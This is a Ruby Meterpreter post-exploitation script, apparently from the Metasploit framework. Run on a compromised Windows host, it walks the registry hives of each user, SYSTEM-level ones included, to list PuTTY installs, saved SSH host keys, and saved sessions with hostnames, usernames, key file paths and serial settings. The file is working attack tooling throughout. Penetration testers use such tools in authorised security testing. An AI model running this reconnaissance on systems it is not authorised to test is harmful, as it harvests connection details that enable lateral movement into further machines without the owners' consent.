# $Id$
#
# Meterpreter script for enumerating putty connections
# Provided by Carlos Perez at carlos_perez[at]darkoperator[dot]com
#
# $Revision$
@client = client
#Options and Option Parsing
opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line "Meterpreter Script for enumerating Putty Configuration."
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
}

def hkcu_base
	key_base = []
	user = @client.sys.config.getuid
	if user != "NT AUTHORITY\\SYSTEM"
		key_base << "HKCU"
	else
		key = "HKU\\"
		root_key, base_key = @client.sys.registry.splitkey(key)
		open_key = @client.sys.registry.open_key(root_key, base_key)
		keys = open_key.enum_key
		keys.each do |k|
			key_base << "HKU\\#{k}" if k =~ /S-1-5-21-\d*-\d*-\d*-\d{4}$/
		end
	end
end
def check_putty(reg_key_base)
	installed = false
	app_list = []
	app_list = registry_enumkeys("#{reg_key_base}\\Software")
	username_profile = registry_getvaldata("#{reg_key_base}\\Volatile Environment","USERNAME")
	if app_list.index("SimonTatham")
		print_status("Putty Installed for #{username_profile}")
		installed = true
	end
	return installed
end

def enum_known_ssh_hosts(reg_key_base)
	print_status("Saved SSH Server Public Keys:")
	registry_enumvals("#{reg_key_base}\\Software\\SimonTatham\\PuTTY\\SshHostKeys").each do |host|
		print_status("\t#{host}")
	end
end

def enum_saved_sessions(reg_key_base)
	saved_sessions = []
	sessions_protocol = ""
	sessions_key = "#{reg_key_base}\\Software\\SimonTatham\\PuTTY\\Sessions"
	saved_sessions = registry_enumkeys(sessions_key)
	if saved_sessions.length > 0
		saved_sessions.each do |saved_session|
			print_status("Session #{saved_session}:")
			sessions_protocol = registry_getvaldata(sessions_key+"\\"+saved_session,"Protocol")
			if sessions_protocol =~ /ssh/
				print_status("\tProtocol: SSH")
				print_status("\tHostname: #{registry_getvaldata(sessions_key+"\\"+saved_session,"HostName")}")
				print_status("\tUsername: #{registry_getvaldata(sessions_key+"\\"+saved_session,"UserName")}")
				print_status("\tPublic Key: #{registry_getvaldata(sessions_key+"\\"+saved_session,"PublicKeyFile")}")
			elsif sessions_protocol =~ /serial/
				print_status("\tProtocol: Serial")
				print_status("\tSerial Port: #{registry_getvaldata(sessions_key+"\\"+saved_session,"SerialLine")}")
				print_status("\tSpeed: #{registry_getvaldata(sessions_key+"\\"+saved_session,"SerialSpeed")}")
				print_status("\tData Bits: #{registry_getvaldata(sessions_key+"\\"+saved_session,"SerialDataBits")}")
				print_status("\tFlow Control: #{registry_getvaldata(sessions_key+"\\"+saved_session,"SerialFlowControl")}")
			end
		end
	end
end
hkcu_base.each do |hkb|
	if check_putty(hkb)
		enum_known_ssh_hosts(hkb)
		enum_saved_sessions(hkb)
	end
end